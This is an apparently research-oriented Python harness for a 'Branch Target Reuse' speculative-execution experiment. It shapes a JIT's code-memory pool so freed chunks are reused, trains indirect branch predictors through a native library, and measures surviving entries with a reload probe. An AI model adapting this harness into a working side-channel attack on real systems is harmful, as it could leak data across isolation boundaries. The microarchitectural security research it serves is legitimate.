#!/usr/bin/env python

# Branch Target Reuse (BTR)
# April 30th 2026
# Yuhui Zhu

import random
import time
import pdb
import gc
import ctypes
import os
import sys

TRAIN_PROG_TEMPLATE = '''\
def func{}():
    pass'''
TARGET_PROG_FRAG = '''\
def func{}(array):
    array[0] = 1
    a = array[1]
    b = array[2]
    c = array[3]
    a1 = int(str(a) + str(b) + str(c))
    # b1 = int(str(b) + str(c) + str(a))
    # c1 = int(str(c) + str(a) + str(b))
    return a, b, c
'''

global_counter = 0
target_prog_template = None
tenured_progs = []

# Warm-up, then gap-fill, before the measured reps. Override both with CLI flags
# (--warmup-reps / --fill-batches) and sweep per-uarch.
#   WARMUP_REPS   -- iterations force_jit_utils() runs to tier up the framework
#                    functions (to tier 2); freeing their chunks leaves holes.
#   FILL_BATCHES  -- batches of 20 persistent tier-1 chunks (fill_tenured_progs_batch)
#                    allocated after the warm-up to occupy those holes, so the
#                    measured reps allocate from a compacted pool.
#   FILL_JIT_ITERS-- run count passed to fill_tenured_progs_batch (it runs each
#                    chunk FILL_JIT_ITERS/2 times; kept at the tier-1 band).
WARMUP_REPS = 30
FILL_BATCHES = 80
FILL_JIT_ITERS = 2000
# How many times reclaim() runs its throwaway function. Measured (address-based
# replace_rate) reuse is much higher at 50 than at 0, so it is load-bearing after
# all. Override with --reclaim-runs.
RECLAIM_RUNS = 100
# Seconds to let the background compile queue drain after the warm-up loop.
WARMUP_DRAIN = 1.0
# Module-name roots run_iteration builds chunk names from. Start warm-prefixed
# so the black-run warm-up's chunks are ignored by replace_rate; force_jit_utils
# switches these to the real roots (train/target/gc) in place before measuring.
name_prefixes = ["warmtrain", "warmtarget", "warmgc0", "warmgc1"]

# How many warm-up batches to strong-reference (lock in memory). 0 = all of them
# (the whole warm-up region stays solid); N > 0 = only the last N batches, to
# save memory. Override with --pin-last-batches.
PIN_LAST_BATCHES = 0
pinned_warmup = []

nr_bh               = 4096
nr_bcond            = 128
nr_bcond_taken      = 32
nr_trainer          = 4
nr_target           = 4
len_trainer         = 1
len_target          = 1
repeats             = 10
flag_skip_reuse     = False

class Config(ctypes.Structure):
    _fields_ = [
        ("cpu_nr",             ctypes.c_int),                           # not used
        ("fr_buf",             ctypes.POINTER(ctypes.c_uint8) * 2),     # uint8_t *[N_FR_BUF]
        ("history",            ctypes.POINTER(ctypes.c_uint8) * 9000),  # uint8_t *[MAX_N_HISTORIES]
        ("n_histories",        ctypes.c_int),
        ("history_size",       ctypes.c_int),
        ("his_taken_branches", ctypes.c_int),
        ("busy_cycles",        ctypes.c_size_t),                        # not used
        ("usleep",             ctypes.c_size_t),                        # not used
        ("n_forks",            ctypes.c_int),                           # not used
        ("loop_type",          ctypes.c_int),                           # = LOOP_NONE
        ("do_overwrite",       ctypes.c_int),                           # = 0
        ("train_type",         ctypes.c_int),                           # = TRAIN_MOCK_TARGET
    ]

_clib: ctypes.CDLL | None = None
_cfg: Config | None = None

CFG_FIELD_NOT_USED = 0

def init_config():
    global _cfg
    if _cfg is not None:
        return
    _cfg = Config()
    # Fill unused or fixed fields
    _cfg.busy_cycles         = CFG_FIELD_NOT_USED
    _cfg.usleep              = CFG_FIELD_NOT_USED
    _cfg.n_forks             = CFG_FIELD_NOT_USED
    _cfg.loop_type           = 0
    _cfg.do_overwrite        = 0
    _cfg.train_type          = 1
    _cfg.cpu_nr              = CFG_FIELD_NOT_USED

def update_config(n_his, his_size, his_taken):
    global _cfg
    if _cfg is None:
        init_config()
    _cfg.n_histories         = n_his
    _cfg.history_size        = his_size
    _cfg.his_taken_branches  = his_taken

def _get_clib() -> ctypes.CDLL:
    global _clib
    if _clib is None:
        _lib = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "..", "..", "..", "libfr.so",
        )
        _clib = ctypes.CDLL(_lib)
        _clib.do_train.argtypes  = [ctypes.POINTER(Config), ctypes.c_int]
        _clib.do_train.restype   = None
        _clib.do_reload.argtypes = [ctypes.POINTER(Config), ctypes.c_uint64 * 2, ctypes.c_uint64]
        _clib.do_reload.restype  = ctypes.c_uint64
        _clib.randomize_history.argtypes = [ctypes.POINTER(Config), ctypes.POINTER(ctypes.c_uint8)]
        _clib.randomize_history.restype  = None
        _clib.init_buffers.argtypes = [ctypes.POINTER(Config)]
        _clib.init_buffers.restype  = None
        _clib.main.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p)]
        _clib.main.restype  = ctypes.c_int
    return _clib

def init_all_rand_bh():
    global _cfg
    for i in range(_cfg.n_histories):
        _clib.randomize_history(ctypes.byref(_cfg), _cfg.history[i])

def init_buffers():
    global _cfg
    _clib.init_buffers(ctypes.byref(_cfg))

_clib = _get_clib()
init_config()

dummy_callee = None
def init_dummy_callee():
    global dummy_callee
    if dummy_callee is not None:
        return
    train_mod = compile(TRAIN_PROG_TEMPLATE.format(0), "global_dummy_callee", "exec")
    train_globals = {}
    exec(train_mod, train_globals)
    dummy_callee = train_globals["func0"]
    for i in range(1000):
        dummy_callee()
    time.sleep(0.01)

def fill_tenured_progs_batch(jit_iterations):
    global tenured_progs
    tenured_batch = []
    tenured_globals = {}
    for i in range(20):
        func_id = "_{}_{}".format(global_counter, i)
        tenured_prog = compile(TRAIN_PROG_TEMPLATE.format(func_id), "tenured_{}_{}".format(global_counter, i), "exec", optimize=2)
        exec(tenured_prog, tenured_globals)
        # don't run too many times to avoid tier 2 compilation, which would cause tier 1 code leaving gaps in VA space!
        for _ in range(int(jit_iterations / 2)):
            tenured_globals["func{}".format(func_id)]()
        tenured_batch.append(tenured_globals["func{}".format(func_id)])
    tenured_progs.append(tenured_batch)

def init_target_prog_template(len):
    global target_prog_template
    target_prog_template = ''
    for i in range(0, len):
        target_prog_template += TARGET_PROG_FRAG.format(i)

def parse_args() -> None:
    global nr_bh, nr_bcond, nr_bcond_taken
    global nr_trainer, nr_target, len_trainer, len_target, repeats
    global flag_skip_reuse
    global WARMUP_REPS, FILL_BATCHES, RECLAIM_RUNS, PIN_LAST_BATCHES
    argv = sys.argv[1:]
    i = 0
    while i < len(argv):
        arg = argv[i]
        if arg == "--nr-bh" and i + 1 < len(argv):
            nr_bh = int(argv[i + 1]); i += 2
        elif arg == "--nr-bcond" and i + 1 < len(argv):
            nr_bcond = int(argv[i + 1]); i += 2
        elif arg == "--nr-bcond-taken" and i + 1 < len(argv):
            nr_bcond_taken = int(argv[i + 1]); i += 2
        elif arg == "--nr-trainer" and i + 1 < len(argv):
            nr_trainer = int(argv[i + 1]); i += 2
        elif arg == "--len-trainer" and i + 1 < len(argv):
            len_trainer = int(argv[i + 1]); i += 2
        elif arg == "--nr-target" and i + 1 < len(argv):
            nr_target = int(argv[i + 1]); i += 2
        elif arg == "--len-target" and i + 1 < len(argv):
            len_target = int(argv[i + 1]); i += 2
        elif arg == "--skip-reuse":
            flag_skip_reuse = True; i += 1
        elif arg == "--warmup-reps" and i + 1 < len(argv):
            WARMUP_REPS = int(argv[i + 1]); i += 2
        elif arg == "--fill-batches" and i + 1 < len(argv):
            FILL_BATCHES = int(argv[i + 1]); i += 2
        elif arg == "--reclaim-runs" and i + 1 < len(argv):
            RECLAIM_RUNS = int(argv[i + 1]); i += 2
        elif arg == "--pin-last-batches" and i + 1 < len(argv):
            PIN_LAST_BATCHES = int(argv[i + 1]); i += 2
        else:
            i += 1

init_dummy_callee()

def reclaim(name):
    # Compile and run a throwaway no-op function, then drop and GC it, so the
    # JIT code of the previous phase's chunks becomes collectible.
    gc_mod = compile(TRAIN_PROG_TEMPLATE.format(0), name, "exec")
    gc_globals = {}
    exec(gc_mod, gc_globals)
    for i in range(RECLAIM_RUNS):
        gc_globals["func0"]()

    time.sleep(0.05)
    gc_mod = None
    gc_globals.clear()
    gc.collect()
    time.sleep(0.05)

def compile_trainer_chunks(prefix, sink=None):
    # Compile `nr_target` trainer chunks and run each 1000x to tier 1. `sink` is
    # None on the measured path (unchanged behavior); the warm-up passes a list
    # to strong-reference the chunks so they are not freed.
    for i in range(nr_target):
        train_mod = compile(TRAIN_PROG_TEMPLATE.format(0), "{}_{}".format(prefix, i), "exec")
        train_globals = {}
        exec(train_mod, train_globals)
        f = train_globals["func0"]
        for _ in range(1000):
            f()
        if sink is not None:
            sink.append(f)
        time.sleep(0.01)

def compile_target_chunks(prefix, sink=None):
    # Compile `nr_target` target chunks and run each 1000x to tier 1. `sink` as
    # in compile_trainer_chunks.
    target_globals = {}
    for i in range(nr_target):
        target_mod = compile(TARGET_PROG_FRAG.format(0), "{}_{}".format(prefix, i), "exec", optimize=2)
        exec(target_mod, target_globals)
        f = target_globals["func0"]
        for _ in range(1000):
            f([0, 0, 0, 0])
        if sink is not None:
            sink.append(f)
        time.sleep(0.01)

def dispatch_dummies():
    for _ in range(nr_bh):
        dummy_callee()

def run_iteration(idx):
    # One attack iteration. Module-name roots come from the shared name_prefixes
    # list; its contents differ between warm-up and measured runs but the code
    # path is identical, so run_iteration never deopts at the boundary.
    train_prefix  = "{}_{}".format(name_prefixes[0], idx)
    target_prefix = "{}_{}".format(name_prefixes[1], idx)
    gc0_name      = "{}_{}".format(name_prefixes[2], idx)
    gc1_name      = "{}_{}".format(name_prefixes[3], idx)

    # Trigger GC to reclaim target chunks
    reclaim(gc0_name)

    # Trigger compile for training chunks
    compile_trainer_chunks(train_prefix)

    # Simulate training iBTB
    hits = (ctypes.c_uint64 * 2)(0, 0)
    _clib.do_train(ctypes.byref(_cfg), 1)

    if not flag_skip_reuse:
        gc.collect()
        time.sleep(0.05)

        # Trigger GC to reclaim training chunks
        reclaim(gc1_name)

        # Trigger compile for target chunks
        compile_target_chunks(target_prefix)

        dispatch_dummies()

    # Mis-speculate to test survive iBTB entries
    _clib.do_reload(ctypes.byref(_cfg), hits, 0)
    print(hits[0], hits[1])

    gc.collect()
    return [int(hits[0]), int(hits[1])]

def setup():
    parse_args()
    print("Config: nr_bh={}, nr_bcond={}, nr_bcond_taken={}, nr_trainer={}, len_trainer={}, nr_target={}, len_target={}, skip_reuse={}".format(
        nr_bh, nr_bcond, nr_bcond_taken, nr_trainer, len_trainer, nr_target, len_target, flag_skip_reuse
    ))
    print("train_type={}, loop_type={}, do_overwrite={}, warmup_reps={}, fill_batches={}, reclaim_runs={}, pin_last_batches={}".format(
        _cfg.train_type, _cfg.loop_type, _cfg.do_overwrite, WARMUP_REPS, FILL_BATCHES, RECLAIM_RUNS, PIN_LAST_BATCHES
    ))
    update_config(nr_bh, nr_bcond, nr_bcond_taken)
    init_buffers()
    init_all_rand_bh()

def force_jit_utils():
    # Tier up the compile/exec/run machinery and pre-occupy the exec-mem pool
    # with WARMUP_REPS batches of train- and target-shaped chunks, every one
    # strong-referenced in pinned_warmup so none is ever freed -- the warm-up
    # region stays solid with no holes. No gc between them, so no gaps form.
    global global_counter
    # 1. Black-run the whole iteration body WARMUP_REPS times (names are warm-
    #    prefixed, so replace_rate ignores them). This tiers up every framework
    #    function INCLUDING the slow outermost run_iteration/main_loop (they reach
    #    T1 around invocation ~27, so ~30 settles them). The chunks are freed by
    #    the body's own gc, leaving holes.
    for _ in range(WARMUP_REPS):
        main_loop()
    gc.collect()
    time.sleep(WARMUP_DRAIN)
    # 2. Fill those holes once with persistent tier-1 filler, locked in
    #    tenured_progs so the region is solid before the measured reps.
    for _ in range(FILL_BATCHES):
        global_counter += 1
        fill_tenured_progs_batch(FILL_JIT_ITERS)
    gc.collect()
    time.sleep(WARMUP_DRAIN)
    # 3. Switch the module-name roots to the measured ones in place (same list
    #    object, so the warmed run_iteration reads new values without deopting).
    name_prefixes[0] = "train"
    name_prefixes[1] = "target"
    name_prefixes[2] = "gc0"
    name_prefixes[3] = "gc1"
    global_counter = 0

def main_loop():
    global global_counter
    global_counter += 1
    return run_iteration(global_counter)

setup()
force_jit_utils()